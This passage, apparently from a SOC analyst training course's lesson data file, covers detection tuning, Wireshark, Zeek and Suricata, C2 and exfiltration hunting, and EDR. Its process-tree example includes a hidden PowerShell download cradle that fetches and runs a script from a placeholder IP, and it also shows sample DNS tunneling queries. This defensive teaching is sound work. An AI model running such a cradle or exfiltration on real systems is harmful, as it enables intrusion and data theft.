    ["OriginalFileName", "PE metadata name that survives renaming of a binary"]
  ],
  standards: ["MITRE ATT&CK T1218.011"],
  labs: ["lab-siem-hunt", "lab-attack-mapping"]
},
{
  id: "p2-m3-l4",
  module: "p2-m3",
  title: "Tuning Detections and Managing False Positives",
  minutes: 16,
  objectives: [
    "Diagnose why a rule produces false positives",
    "Apply safe tuning techniques without creating blind spots",
    "Document exclusions with scope, owner and expiry",
    "Balance precision and recall for different alert severities"
  ],
  html: `
<p>Every detection lives on a trade-off between catching everything (high <b>recall</b>, many false positives) and alerting only when certain (high <b>precision</b>, risk of misses). Tuning moves that dial deliberately. Bad tuning is one of the most common ways attackers end up hiding in plain sight.</p>

<h3>Why rules get noisy</h3>
<ul>
  <li><b>Legitimate tools behave like attackers</b>: IT uses PsExec, SCCM runs PowerShell, backup software reads every file.</li>
  <li><b>Thresholds set without baselines</b>: "10 failed logons" means nothing for a service account that retries every minute.</li>
  <li><b>Missing context</b>: the rule does not know which hosts are jump boxes or which users are admins.</li>
  <li><b>Environment change</b>: a new application rolls out and suddenly triggers hundreds of alerts.</li>
</ul>

<h3>Tuning techniques, safest first</h3>
<ol>
  <li><b>Add context instead of excluding</b>: lower severity for known admin hosts but keep the alert; raise severity for crown-jewel assets.</li>
  <li><b>Narrow, specific exclusions</b>: exclude the exact combination of parent process <i>and</i> path <i>and</i> signer <i>and</i> host group &mdash; never just a process name.</li>
  <li><b>Adjust thresholds</b> using data: look at the 95th or 99th percentile of normal behavior.</li>
  <li><b>Aggregate</b>: one alert per host per hour instead of one per event.</li>
  <li><b>Convert to risk events</b>: feed low-fidelity signals into risk-based alerting rather than the queue.</li>
</ol>

<h3>Bad versus good exclusion</h3>
<pre><code># BAD - attacker just names their tool the same, or runs it from that path
filter:
  Image|endswith: '\\powershell.exe'

# GOOD - scoped to the specific signed management agent, its path and its parent
filter_sccm:
  ParentImage: 'C:\\Windows\\CCM\\CcmExec.exe'
  CommandLine|contains: '\\CCM\\SystemTemp\\'
  User|startswith: 'NT AUTHORITY\\SYSTEM'</code></pre>

<h3>Using data to set a threshold (KQL)</h3>
<pre><code>SecurityEvent
| where TimeGenerated &gt; ago(30d) and EventID == 4625
| summarize Fails = count() by TargetUserName, bin(TimeGenerated, 1h)
| summarize p95 = percentile(Fails, 95), p99 = percentile(Fails, 99), Max = max(Fails)</code></pre>
<h3>SPL equivalent</h3>
<pre><code>index=wineventlog EventCode=4625 earliest=-30d
| bin _time span=1h
| stats count AS fails BY TargetUserName _time
| stats perc95(fails) AS p95 perc99(fails) AS p99 max(fails) AS max</code></pre>
<p>Set the threshold just above p99 for a high-severity rule, and consider a separate low-severity risk event at p95.</p>

<h3>Document every exclusion</h3>
<table>
  <tr><th>Field</th><th>Example</th></tr>
  <tr><td>Rule</td><td>Suspicious PsExec Service Install (7045)</td></tr>
  <tr><td>Exclusion</td><td>ServiceFileName = C:\\Windows\\PSEXESVC.exe AND source host in group "IT-JumpHosts"</td></tr>
  <tr><td>Reason</td><td>Patch team uses PsExec from jump hosts (CHG-44821)</td></tr>
  <tr><td>Owner</td><td>IT Ops &ndash; Windows Platform</td></tr>
  <tr><td>Review/expiry</td><td>2027-04-01</td></tr>
</table>
<p>Exclusions without an owner and expiry accumulate forever. Attackers who compromise a jump host inherit every exclusion it has &mdash; so pair exclusions with compensating detections (e.g., alert if a jump-host account logs on interactively somewhere unusual).</p>

<div class="callout warn"><b>Warning:</b> Never tune by disabling a rule because "it is always false positive" without checking its history. Look for any past true positives, and confirm the technique is covered elsewhere. Disabled rules are invisible blind spots.</div>

<div class="callout real"><b>On the job:</b> Many SOCs hold a weekly tuning review where analysts bring the top 10 noisiest rules with evidence. Bringing data (volume, FP examples, proposed precise exclusion) is how Tier 1 analysts get noticed and promoted into detection engineering.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 asks about reducing false positives and the risk of over-tuning (introducing false negatives). Expect "BEST way to reduce noise while maintaining visibility" questions &mdash; the answer is usually a scoped tuning change, not disabling the rule.</div>
`,
  keyTerms: [
    ["Precision", "Fraction of alerts that are true positives"],
    ["Recall", "Fraction of real malicious events that generate an alert"],
    ["Tuning", "Adjusting detection logic to reduce false positives while retaining coverage"],
    ["Scoped exclusion", "Exception narrowly defined by multiple attributes, owner and expiry"],
    ["Baseline", "Measured normal behavior used to set thresholds and spot anomalies"],
    ["Percentile threshold", "Threshold set using p95/p99 of historical normal activity"],
    ["Compensating detection", "Additional detection that covers risk introduced by an exclusion"]
  ],
  labs: ["lab-alert-triage", "lab-siem-hunt"]
}
);

/* ===================== p2-m4 Network Traffic Analysis ===================== */
CP.lessons.push(
{
  id: "p2-m4-l1",
  module: "p2-m4",
  title: "Packet Analysis with Wireshark",
  minutes: 22,
  objectives: [
    "Distinguish full packet capture, flow data and protocol logs",
    "Use Wireshark display filters and capture filters correctly",
    "Follow streams, read the TCP handshake and export transferred objects",
    "Work through a PCAP investigation methodically"
  ],
  html: `
<p>Network evidence is hard for attackers to erase: they can clear logs on a host, but packets that already crossed a sensor are recorded elsewhere. Analysts work with three levels of network data:</p>
<table>
  <tr><th>Type</th><th>Content</th><th>Volume</th><th>Tools</th></tr>
  <tr><td><b>Full packet capture (PCAP)</b></td><td>Every byte, including payloads</td><td>Huge; usually kept hours to days</td><td>Wireshark, tcpdump, Arkime</td></tr>
  <tr><td><b>Protocol metadata</b></td><td>Parsed records per connection, DNS query, HTTP request, TLS handshake</td><td>Moderate</td><td>Zeek, Suricata EVE, Corelight</td></tr>
  <tr><td><b>Flow data</b></td><td>Who talked to whom, when, how much (5-tuple + bytes)</td><td>Small; kept months</td><td>NetFlow/IPFIX, VPC Flow Logs</td></tr>
</table>

<h3>Capturing</h3>
<p>Capture with <code>tcpdump</code> or Wireshark (dumpcap). <b>Capture filters</b> use BPF syntax and decide what is recorded; <b>display filters</b> use Wireshark syntax and only hide packets in the view. Do not confuse them.</p>
<pre><code># BPF capture filter (tcpdump): only traffic to/from one host, port 443 or 53
tcpdump -i eth0 -w case42.pcap 'host 10.1.4.22 and (port 443 or port 53)'</code></pre>

<h3>Essential display filters</h3>
<table>
  <tr><th>Filter</th><th>Purpose</th></tr>
  <tr><td><code>ip.addr == 10.1.4.22</code></td><td>Traffic to or from a host</td></tr>
  <tr><td><code>tcp.port == 4444</code></td><td>A specific port (4444 = Metasploit default)</td></tr>
  <tr><td><code>dns</code> / <code>dns.qry.name contains "xyz"</code></td><td>DNS traffic / a specific query</td></tr>
  <tr><td><code>http.request</code></td><td>All HTTP requests</td></tr>
  <tr><td><code>http.request.method == "POST"</code></td><td>Uploads, form submissions, C2 check-ins</td></tr>
  <tr><td><code>tls.handshake.type == 1</code></td><td>TLS Client Hello (see SNI)</td></tr>
  <tr><td><code>tls.handshake.extensions_server_name</code></td><td>The SNI hostname, even in encrypted traffic</td></tr>
  <tr><td><code>tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0</code></td><td>Connection attempts (scans)</td></tr>
  <tr><td><code>tcp.analysis.retransmission</code></td><td>Network problems or failing C2</td></tr>
  <tr><td><code>smb2</code>, <code>kerberos</code>, <code>ntlmssp</code></td><td>Windows lateral movement protocols</td></tr>
  <tr><td><code>frame contains "MZ"</code></td><td>Possible Windows executable in transit</td></tr>
  <tr><td><code>!(arp or dns or icmp)</code></td><td>Remove noise</td></tr>
</table>

<h3>Reading TCP</h3>
<p>A normal connection: <b>SYN &rarr; SYN/ACK &rarr; ACK</b>, data, then FIN/ACK or RST. Many SYNs to different ports with RST replies = port scan. Many SYNs with no reply = filtered ports or a dead host. Repeated identical small connections at regular intervals = possible beaconing.</p>

<h3>Methodical PCAP investigation</h3>
<ol>
  <li><b>Statistics &rarr; Capture File Properties</b>: time span, packet count.</li>
  <li><b>Statistics &rarr; Conversations</b> (IPv4/TCP tabs): sort by bytes &mdash; who talked most? Any internal host sending large volumes outbound?</li>
  <li><b>Statistics &rarr; Protocol Hierarchy</b>: anything unexpected (IRC, TFTP, raw high-port TCP)?</li>
  <li><b>DNS</b>: list queried names. Look for random-looking domains, newly registered domains, and very long subdomains.</li>
  <li><b>HTTP/TLS</b>: review requests, user agents, SNI values and certificate issuers (self-signed certs to IPs are suspicious).</li>
  <li><b>Follow &rarr; TCP/HTTP Stream</b> on suspicious sessions to read the conversation.</li>
  <li><b>File &rarr; Export Objects &rarr; HTTP/SMB</b> to extract transferred files; hash them and check reputation (do not open them).</li>
</ol>

<h3>Example: following an HTTP stream</h3>
<pre><code>GET /wp-content/plugins/up/inv.dat HTTP/1.1
Host: shop-update.example
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1)
Accept: */*

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 348160

MZ..........This program cannot be run in DOS mode....</code></pre>
<p>A <code>.dat</code> file that starts with <code>MZ</code> (Windows PE header) downloaded with an ancient IE7 user agent from a compromised WordPress path: a malware payload disguised as data. Export it, take the SHA-256, and pivot to which other hosts fetched the same URI.</p>

<h3>Encrypted traffic</h3>
<p>Most traffic is TLS 1.3 now, so payloads are hidden. You can still see: destination IP, SNI (unless Encrypted Client Hello is used), certificate details in TLS 1.2, timing and size patterns, and client fingerprints such as <b>JA3/JA4</b>. In a lab, you can decrypt by loading the browser's <code>SSLKEYLOGFILE</code> into Wireshark (Preferences &rarr; Protocols &rarr; TLS).</p>

<div class="callout tip"><b>Tip:</b> Set Wireshark's time display to UTC (View &rarr; Time Display Format &rarr; UTC Date and Time of Day) so packets line up with your SIEM timeline. Add columns for <code>http.host</code> and <code>tls.handshake.extensions_server_name</code> to see destinations at a glance.</div>

<div class="callout warn"><b>Warning:</b> PCAPs from real incidents contain live malware and sensitive data (credentials, personal data). Analyze them in an isolated VM, never extract and open files on your workstation, and handle captures according to your data-handling policy.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.2 (network indicators: beaconing, irregular peer-to-peer, unexpected protocols) and 1.3 (Wireshark, tcpdump) are tested with screenshots and filter syntax. BTL1 has a full network analysis domain built around Wireshark.</div>
`,
  keyTerms: [
    ["PCAP", "Packet capture file containing full network packets"],
    ["BPF capture filter", "Berkeley Packet Filter expression controlling what is captured"],
    ["Display filter", "Wireshark expression controlling what is shown from a capture"],
    ["Follow stream", "Wireshark feature reconstructing a full conversation between two endpoints"],
    ["Export Objects", "Wireshark feature extracting files transferred over HTTP, SMB and other protocols"],
    ["SNI", "Server Name Indication: hostname sent in the TLS Client Hello"],
    ["Three-way handshake", "SYN, SYN/ACK, ACK sequence that opens a TCP connection"],
    ["MZ header", "Magic bytes identifying a Windows PE executable"]
  ],
  standards: ["RFC 9293", "RFC 8446"],
  labs: ["lab-pcap"]
},
{
  id: "p2-m4-l2",
  module: "p2-m4",
  title: "Zeek and Suricata: Network Security Monitoring",
  minutes: 22,
  objectives: [
    "Explain the roles of Zeek (protocol logging) and Suricata (IDS/IPS)",
    "Read Zeek conn, dns, http, ssl and files logs",
    "Read and write a basic Suricata rule and interpret EVE JSON alerts",
    "Use JA3/JA4 fingerprints and community ID to pivot"
  ],
  html: `
<p><b>Network Security Monitoring (NSM)</b> sensors sit on a SPAN port or network tap and watch traffic passively. Two open-source engines dominate &mdash; often deployed together, for example in Security Onion.</p>

<h3>Zeek: turning packets into logs</h3>
<p><b>Zeek</b> (formerly Bro) does not primarily alert; it writes detailed, structured logs for every protocol it understands. Key logs:</p>
<table>
  <tr><th>Log</th><th>Contains</th></tr>
  <tr><td><code>conn.log</code></td><td>Every connection: uid, ts, id.orig_h/p, id.resp_h/p, proto, service, duration, orig_bytes, resp_bytes, conn_state</td></tr>
  <tr><td><code>dns.log</code></td><td>Queries, query type, answers, rcode (NXDOMAIN floods suggest DGA malware)</td></tr>
  <tr><td><code>http.log</code></td><td>Method, host, URI, user agent, status, MIME types</td></tr>
  <tr><td><code>ssl.log</code></td><td>TLS version, SNI (server_name), certificate validation, JA3/JA4 if enabled</td></tr>
  <tr><td><code>x509.log</code></td><td>Certificate subject, issuer, validity</td></tr>
  <tr><td><code>files.log</code></td><td>Files seen in traffic with MIME type and hashes</td></tr>
  <tr><td><code>notice.log</code> / <code>weird.log</code></td><td>Zeek's own detections / protocol anomalies</td></tr>
</table>
<pre><code>#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service duration orig_bytes resp_bytes conn_state
1760432401.10 CmES1k3 10.1.4.22 52114 91.215.85.17 443 tcp ssl 60.02 1180 1652 SF
1760432461.09 C9xLp2a 10.1.4.22 52130 91.215.85.17 443 tcp ssl 60.01 1180 1652 SF
1760432521.11 CzQ7aa1 10.1.4.22 52141 91.215.85.17 443 tcp ssl 60.03 1180 1652 SF</code></pre>
<p>Connections exactly 60 seconds apart with identical byte counts to the same external IP: textbook <b>beaconing</b>. Command-line analysis with <code>zeek-cut</code>:</p>
<pre><code>cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p | sort | uniq -c | sort -nr | head
cat dns.log | zeek-cut query | awk '{print length, $1}' | sort -nr | head     # longest queries
cat ssl.log | zeek-cut server_name validation_status | grep -v "ok"</code></pre>
<p>Connection states in <code>conn_state</code>: <code>S0</code> (SYN, no reply &mdash; scanning), <code>REJ</code> (rejected), <code>SF</code> (normal), <code>RSTO/RSTR</code> (reset). Each record's <code>uid</code> links it to the matching entries in http, ssl and files logs.</p>

<h3>Suricata: signature-based IDS/IPS</h3>
<p><b>Suricata</b> inspects traffic against rules (the ET Open ruleset is free; ET Pro is commercial) and outputs alerts plus protocol metadata to <b>EVE JSON</b>. It can run inline as an IPS to drop traffic. Snort 3 uses a nearly identical rule language.</p>
<h4>Rule anatomy</h4>
<pre><code>alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg:"CYBERPATH Possible PowerShell download cradle UA";
  flow:established,to_server; http.user_agent; content:"WindowsPowerShell"; nocase;
  classtype:trojan-activity; sid:9000101; rev:1; metadata:mitre_technique_id T1059.001;)</code></pre>
<ul>
  <li><b>Header</b>: action (<code>alert</code>, <code>drop</code>, <code>pass</code>), protocol, source, direction, destination.</li>
  <li><b>Options</b>: <code>msg</code>, <code>flow</code>, sticky buffers like <code>http.uri</code>, <code>http.user_agent</code>, <code>dns.query</code>, <code>tls.sni</code>; <code>content</code> matches; <code>pcre</code>; <code>sid</code>/<code>rev</code> unique ID and revision.</li>
</ul>
<h4>EVE JSON alert</h4>
<pre><code>{"timestamp":"2026-10-14T14:20:11.551+0000","event_type":"alert","src_ip":"10.1.4.22","src_port":52311,
 "dest_ip":"185.199.110.153","dest_port":80,"proto":"TCP","community_id":"1:LQU9qZlK+B5F3KDmev6m5PMibrg=",
 "alert":{"action":"allowed","signature_id":9000101,"signature":"CYBERPATH Possible PowerShell download cradle UA",
 "category":"A Network Trojan was detected","severity":1},
 "http":{"hostname":"raw.example.net","url":"/a/stage2.ps1","http_user_agent":"Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1"}}</code></pre>
<p><code>action: allowed</code> means IDS mode &mdash; the traffic was <i>not</i> blocked. Pivot on <code>community_id</code>, a standardized flow hash that lets you find the same connection in Zeek, Suricata and many EDRs.</p>

<h3>TLS fingerprinting: JA3 and JA4</h3>
<p><b>JA3</b> hashes fields from the TLS Client Hello to fingerprint the client software. Because modern browsers randomize extension order, JA3 has become less reliable; <b>JA4+</b> (FoxIO) is the newer, more robust suite (JA4 for clients, JA4S for servers, JA4H for HTTP, JA4X for certificates). A fingerprint matching known Cobalt Strike, Sliver or a Python requests library on a workstation that should only run browsers is worth investigating.</p>

<h3>Querying NSM data in a SIEM</h3>
<pre><code>SPL (Zeek in Splunk):
index=zeek sourcetype=zeek_dns earliest=-24h
| eval qlen=len(query)
| where qlen &gt; 60
| stats count dc(query) AS uniq BY id.orig_h
| sort - uniq

KQL (Zeek/Corelight or ASIM DNS):
_Im_Dns(starttime=ago(24h))
| where strlen(DnsQuery) &gt; 60
| summarize Queries = count(), Unique = dcount(DnsQuery) by SrcIpAddr
| order by Unique desc</code></pre>

<div class="callout real"><b>On the job:</b> A Suricata alert alone is rarely conclusive &mdash; ET rules are broad. The analyst's job is to pull the related Zeek logs (same community_id or uid), the host's EDR process data for that connection, and decide what actually happened.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 expects you to know IDS vs IPS, signature vs anomaly detection, and to recognize Snort/Suricata rule syntax. BTL1 includes Snort/Suricata rule reading and Zeek-style log analysis.</div>
`,
  keyTerms: [
    ["NSM", "Network Security Monitoring: passive collection and analysis of network traffic"],
    ["Zeek", "Open-source network analysis framework that produces structured protocol logs"],
    ["conn_state", "Zeek field summarizing TCP connection outcome (S0, SF, REJ, etc.)"],
    ["Suricata", "Open-source IDS/IPS engine using signature rules and producing EVE JSON"],
    ["sid", "Unique signature ID of a Snort/Suricata rule"],
    ["Community ID", "Standard hash of a flow's 5-tuple enabling cross-tool pivoting"],
    ["JA3 / JA4", "TLS client fingerprinting methods; JA4+ is the more robust successor"],
    ["Beaconing", "Regular, periodic callbacks from malware to command-and-control infrastructure"]
  ],
  standards: ["MITRE ATT&CK T1071.001", "MITRE ATT&CK T1573"],
  labs: ["lab-pcap", "lab-siem-hunt"]
},
{
  id: "p2-m4-l3",
  module: "p2-m4",
  title: "Detecting C2, DNS Tunneling and Exfiltration",
  minutes: 20,
  objectives: [
    "Recognize beaconing using interval, jitter and size analysis",
    "Detect DNS tunneling and DGA domains",
    "Identify data exfiltration patterns in flow and proxy data",
    "Spot scanning and lateral movement on the internal network"
  ],
  html: `
<p>Once an attacker has code running inside your network, it needs to talk home. <b>Command and control (C2)</b> traffic and <b>exfiltration</b> are where network analysis shines, because the attacker cannot avoid sending packets.</p>

<h3>Beaconing</h3>
<p>Implants such as Cobalt Strike, Sliver, Havoc, Brute Ratel and many commodity RATs "check in" on a schedule (the <i>sleep</i>) with random variation (the <i>jitter</i>). A 60-second sleep with 20% jitter produces intervals between 48 and 72 seconds. Over hours, this is statistically distinctive compared to human browsing.</p>
<p>Signals:</p>
<ul>
  <li>Many connections from one host to one destination over a long period.</li>
  <li>Low variance in time between connections and in bytes per connection.</li>
  <li>Connections continuing overnight when the user is not working.</li>
  <li>Destinations that are rare across the organization (only 1&ndash;2 hosts ever contact them).</li>
</ul>
<h4>KQL: simple beacon scoring</h4>
<pre><code>DeviceNetworkEvents
| where Timestamp &gt; ago(1d) and RemoteIPType == "Public"
| summarize Times = make_list(Timestamp, 10000), Conns = count() by DeviceName, RemoteIP, RemoteUrl
| where Conns &gt; 50
| mv-apply t = Times to typeof(datetime) on (
    order by t asc
    | extend Delta = datetime_diff('second', t, prev(t))
    | summarize AvgDelta = avg(Delta), StdDelta = stdev(Delta))
| extend Regularity = StdDelta / AvgDelta
| where Regularity &lt; 0.2
| order by Conns desc</code></pre>
<h4>SPL: same idea with streamstats</h4>
<pre><code>index=proxy earliest=-24h
| sort 0 src_ip dest _time
| streamstats current=f last(_time) AS prev BY src_ip dest
| eval delta=_time-prev
| stats count avg(delta) AS avg stdev(delta) AS sd dc(bytes_out) AS sizes BY src_ip dest
| where count&gt;50 AND sd/avg&lt;0.2
| sort - count</code></pre>
<p>Tools like RITA (Active Countermeasures) automate this scoring on Zeek logs. Expect benign beacons: update checkers, telemetry, NTP, EDR agents &mdash; allowlist them by known destinations.</p>

<h3>DNS tunneling and DGAs</h3>
<p><b>DNS tunneling</b> (iodine, dnscat2, and DNS-based C2 channels) encodes data in subdomain labels and TXT responses:</p>
<pre><code>a3f9c1e07b2d44.0001.exfil.badcdn.example  TXT
mzxw6ytboi4dcmrt.0002.exfil.badcdn.example  TXT
nb2hi4dthixs6zdb.0003.exfil.badcdn.example  TXT</code></pre>
<p>Indicators: unusually long query names (over 50&ndash;60 characters), high entropy labels, many unique subdomains under one parent domain, heavy TXT/NULL record use, and a single internal host making thousands of queries to one domain. Also watch for <b>DNS over HTTPS (DoH)</b> to public resolvers from non-browser processes, which bypasses your DNS logging.</p>
<p><b>Domain Generation Algorithms (DGAs)</b> create many pseudo-random domains daily (e.g., <code>xkqjhwpe.info</code>); most do not resolve. A burst of NXDOMAIN responses from one host is the tell.</p>

<h3>Exfiltration</h3>
<ul>
  <li><b>Volume anomalies</b>: an internal host uploading gigabytes outbound, especially at night. In flow data compare <code>orig_bytes</code> vs <code>resp_bytes</code> &mdash; normal browsing downloads more than it uploads.</li>
  <li><b>Cloud storage and file-sharing</b>: rclone to MEGA, Dropbox or attacker-controlled S3 buckets is extremely common in ransomware double-extortion. Watch for the <code>rclone.exe</code> process (often renamed) and connections to <code>mega.nz</code> / <code>*.userstorage.mega.co.nz</code>.</li>
  <li><b>Archive staging</b>: 7-Zip or WinRAR creating large password-protected archives just before the upload.</li>
  <li><b>Unusual protocols</b>: FTP/SFTP outbound from servers that never use them; ICMP with large payloads.</li>
</ul>
<pre><code>SPL:
index=firewall direction=outbound earliest=-24h
| stats sum(bytes_out) AS out BY src_ip dest_ip app
| eval out_gb=round(out/1073741824,2)
| where out_gb &gt; 2
| sort - out_gb</code></pre>

<h3>Internal reconnaissance and lateral movement</h3>
<ul>
  <li>One host connecting to many internal hosts on 445 (SMB), 135 (RPC), 5985/5986 (WinRM), 3389 (RDP) or 22 &mdash; scanning or worm-like spread.</li>
  <li>Workstation-to-workstation SMB or RDP, which is rare in well-run networks.</li>
  <li>LDAP queries in bulk from a non-admin host (BloodHound/SharpHound collection).</li>
</ul>
<pre><code>KQL:
DeviceNetworkEvents
| where Timestamp &gt; ago(1h) and RemotePort in (445, 135, 3389, 5985) and RemoteIPType == "Private"
| summarize Targets = dcount(RemoteIP) by DeviceName, RemotePort
| where Targets &gt; 20</code></pre>

<div class="callout tip"><b>Tip:</b> "Rare destination" is one of the most effective network analytics. If only one host in 10,000 has ever contacted a domain registered 3 days ago, that is worth a look regardless of what any threat feed says.</div>

<div class="callout real"><b>On the job:</b> Attackers increasingly hide C2 inside trusted services &mdash; Microsoft Graph API, Slack, Telegram, Google Sheets, Cloudflare Workers and tunneling tools like ngrok or Cloudflare Tunnel. Domain reputation will say "clean." Process context from EDR (why is <code>rundll32.exe</code> talking to the Telegram API?) is what catches it.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.2 lists beaconing, irregular peer-to-peer communication, bandwidth consumption, rogue devices and unusual traffic spikes as network indicators of compromise &mdash; know each by name.</div>
`,
  keyTerms: [
    ["Command and control (C2)", "Channel an attacker uses to send instructions to and receive data from implants"],
    ["Jitter", "Random variation applied to beacon intervals to evade detection"],
    ["DNS tunneling", "Encoding data inside DNS queries and responses to bypass controls"],
    ["DGA", "Domain Generation Algorithm producing many pseudo-random C2 domains"],
    ["NXDOMAIN", "DNS response meaning the queried domain does not exist"],
    ["Exfiltration", "Unauthorized transfer of data out of the environment"],
    ["DoH", "DNS over HTTPS, which can bypass enterprise DNS monitoring"],
    ["Lateral movement", "Attacker movement from one internal system to another"]
  ],
  standards: ["MITRE ATT&CK T1071.004", "MITRE ATT&CK T1568.002", "MITRE ATT&CK T1567.002", "MITRE ATT&CK T1021.002"],
  labs: ["lab-pcap", "lab-siem-hunt"]
}
);

/* ===================== p2-m5 Endpoint Security & EDR ===================== */
CP.lessons.push(
{
  id: "p2-m5-l1",
  module: "p2-m5",
  title: "EDR, XDR and How Endpoint Detection Works",
  minutes: 18,
  objectives: [
    "Contrast traditional antivirus, NGAV, EDR and XDR",
    "Explain the telemetry EDR collects and how detections are generated",
    "Use EDR response actions appropriately (isolate, kill, quarantine, live response)",
    "Recognize common EDR evasion and tampering techniques"
  ],
  html: `
<p>The endpoint is where attacks execute. Laptops, servers and virtual machines are where phishing payloads run, credentials are stolen and ransomware encrypts. <b>Endpoint Detection and Response (EDR)</b> is now the most important single data source in most SOCs.</p>

<h3>From antivirus to XDR</h3>
<table>
  <tr><th>Generation</th><th>How it works</th><th>Weakness</th></tr>
  <tr><td><b>Signature AV</b></td><td>Matches file hashes and byte patterns against known malware</td><td>Misses new, packed or fileless malware</td></tr>
  <tr><td><b>NGAV</b></td><td>Machine-learning file classification, behavior blocking, exploit prevention</td><td>Still mostly a "block or allow" decision; limited visibility</td></tr>
  <tr><td><b>EDR</b></td><td>Continuously records endpoint activity, detects behaviors, lets analysts investigate and respond remotely</td><td>Needs skilled analysts; generates alerts to triage</td></tr>
  <tr><td><b>XDR</b></td><td>Correlates EDR with email, identity, cloud and network telemetry into unified incidents</td><td>Often strongest within one vendor's ecosystem</td></tr>
</table>
<p>Major platforms: Microsoft Defender for Endpoint (part of Defender XDR), CrowdStrike Falcon, SentinelOne Singularity, Palo Alto Cortex XDR, Sophos Intercept X, Trend Vision One, Elastic Defend. Linux and macOS agents exist for all of them.</p>

<h3>What EDR records</h3>
<ul>
  <li><b>Process events</b>: creation, command line, parent/child lineage, hashes, signer, user, integrity level.</li>
  <li><b>File events</b>: create, modify, rename, delete; Mark-of-the-Web origin.</li>
  <li><b>Registry events</b>: persistence keys, security setting changes.</li>
  <li><b>Network events</b>: connections per process, DNS lookups, listening ports.</li>
  <li><b>Module loads</b>, <b>memory</b> anomalies (unbacked executable memory, injection), <b>AMSI</b> script content, <b>logon</b> events.</li>
</ul>
<p>The agent uses kernel callbacks, ETW (Event Tracing for Windows) providers such as Microsoft-Windows-Threat-Intelligence, and user-mode hooks to observe activity. Detections come from vendor behavioral rules, ML models, your own custom detections, and cloud-side correlation.</p>

<h3>The process tree is the story</h3>
<pre><code>explorer.exe (aturner)
 &#9492;&#9472; OUTLOOK.EXE
     &#9492;&#9472; msedge.exe  https://docs-share.example/view?id=8812
         &#9492;&#9472; [download] Invoice_8812.zip &rarr; Invoice_8812.lnk
 &#9492;&#9472; explorer.exe &rarr; Invoice_8812.lnk
     &#9492;&#9472; cmd.exe /c start /min powershell -w hidden -c "iwr hxxp://198.51.100.40/s.ps1 | iex"
         &#9492;&#9472; powershell.exe
             &#9500;&#9472; network: 198.51.100.40:80
             &#9492;&#9472; rundll32.exe C:\\Users\\aturner\\AppData\\Local\\Temp\\upd.dll,DllRegisterServer
                 &#9492;&#9472; network: 91.215.85.17:443 (every ~60s)</code></pre>
<p>Reading top to bottom: phishing link &rarr; ZIP containing a LNK shortcut (a favorite since Microsoft blocked internet macros by default) &rarr; hidden PowerShell download cradle &rarr; DLL loaded with rundll32 &rarr; beaconing C2. Each hop is a pivot point and an ATT&amp;CK technique.</p>

<h3>Response actions</h3>
<table>
  <tr><th>Action</th><th>When</th><th>Caution</th></tr>
  <tr><td><b>Network isolation / containment</b></td><td>Confirmed or strongly suspected compromise</td><td>Agent keeps a channel to the EDR cloud; check business impact for servers</td></tr>
  <tr><td><b>Kill process</b></td><td>Active malicious process</td><td>Persistence may restart it &mdash; find the mechanism</td></tr>
  <tr><td><b>Quarantine file</b></td><td>Malicious file on disk</td><td>Collect a copy first for analysis</td></tr>
  <tr><td><b>Live response / RTR</b></td><td>Collect artifacts, run scripts, inspect memory</td><td>Every command is logged; follow evidence-handling rules</td></tr>
  <tr><td><b>Block indicator</b></td><td>Prevent hash/domain/IP fleet-wide</td><td>Low on the Pyramid of Pain &mdash; easily changed</td></tr>
  <tr><td><b>Collect investigation package</b></td><td>Before remediation</td><td>Preserves evidence (autoruns, connections, logs)</td></tr>
</table>

<div class="callout warn"><b>Warning:</b> Do not reimage or reboot a compromised host before collecting volatile evidence (memory, running processes, network connections) unless the business risk demands it. Rebooting destroys memory-resident malware and injected code that may be the only evidence.</div>

<h3>EDR evasion and tampering</h3>
<ul>
  <li><b>BYOVD (Bring Your Own Vulnerable Driver)</b>: attackers load a legitimately signed but vulnerable driver to kill EDR processes from the kernel. Microsoft's vulnerable driver blocklist and HVCI mitigate this.</li>
  <li><b>EDR killers/unhookers</b> and tools that silence telemetry by blocking the agent's cloud communications (e.g., using Windows Filtering Platform rules).</li>
  <li><b>Safe Mode reboots</b> (ransomware) where many agents do not run.</li>
  <li><b>Unmanaged devices</b>: attackers pivot to systems without agents &mdash; VPN appliances, hypervisors such as ESXi, NAS devices.</li>
</ul>
<p>Detect it: alerts for sensor tamper, agents going silent ("last seen" gaps), service stops of security products, new kernel drivers (Sysmon 6, Event 7045 with type kernel driver), and exclusions added to Defender (<code>Set-MpPreference -ExclusionPath</code>, Event 5007 in the Defender operational log).</p>

<div class="callout real"><b>On the job:</b> Coverage gaps are the real enemy. Keep a report of assets without a healthy agent and review it weekly. Many ransomware incidents begin on the one server "we didn't install it on because of the application vendor."</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.3 covers EDR capabilities; 1.1 covers system hardening concepts. Expect questions asking which tool provides process-level visibility and remote isolation (EDR) versus cross-domain correlation (XDR or SIEM).</div>
`,
  keyTerms: [
    ["EDR", "Endpoint Detection and Response: continuous endpoint telemetry, detection and remote response"],
    ["XDR", "Extended Detection and Response: correlation of endpoint, email, identity, cloud and network signals"],
    ["NGAV", "Next-Generation Antivirus using ML and behavior instead of only signatures"],
    ["Process tree", "Parent-child hierarchy of processes showing execution lineage"],
    ["Host isolation", "EDR action cutting a device off the network except from the EDR console"],
    ["ETW", "Event Tracing for Windows, a telemetry source used by EDR agents"],
    ["BYOVD", "Bring Your Own Vulnerable Driver: abusing a signed vulnerable driver to disable security tools"],
    ["Live response", "Remote shell or scripting session through the EDR for investigation"]
  ],
  standards: ["MITRE ATT&CK T1562.001", "MITRE ATT&CK T1068"],
  labs: ["lab-powershell-triage", "lab-alert-triage"]
},
{
  id: "p2-m5-l2",
  module: "p2-m5",
  title: "Living off the Land and Persistence",
  minutes: 22,
  objectives: [
    "Recognize normal versus abnormal parent-child process relationships",
    "Identify abuse of LOLBins such as certutil, mshta, rundll32, regsvr32 and bitsadmin",
